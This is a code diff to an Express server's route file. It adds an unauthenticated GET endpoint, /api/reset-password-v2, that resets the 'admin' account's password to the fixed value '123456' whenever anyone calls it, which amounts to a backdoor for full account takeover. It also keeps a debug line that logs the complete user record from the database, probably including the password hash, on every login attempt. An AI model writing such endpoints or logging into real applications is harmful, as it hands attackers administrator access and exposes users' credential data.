@@ -96,6 +96,27 @@ export async function registerRoutes(
   httpServer: Server,
   app: Express,
 ): Promise<Server> {
+  app.get("/api/reset-password-v2", async (_req, res) => {
+    const bcrypt = await import("bcryptjs");
+
+    const hash = await bcrypt.hash("123456", 10);
+
+    const updated = await db
+      .update(users)
+      .set({ password: hash })
+      .where(eq(users.username, "admin"))
+      .returning({
+        id: users.id,
+        username: users.username,
+      });
+
+    res.json({
+      success: true,
+      updatedCount: updated.length,
+      updated,
+    });
+  });
+
   app.post("/api/auth/login", authLimiter, async (req, res) => {
     const parsed = loginSchema.safeParse(req.body);
     if (!parsed.success)
@@ -104,11 +125,11 @@ export async function registerRoutes(
 
     logger.info("login_attempt", { username, ip: req.ip });
 
-      const user = await storage.getUserByUsername(username);
+    const user = await storage.getUserByUsername(username);
 
-      console.log("LOGIN USER FROM DB:", user);
+    console.log("LOGIN USER FROM DB:", user);
 
-      if (!user) {
+    if (!user) {
       logger.warn("failed_login", {
         username,
         reason: "user_not_found",
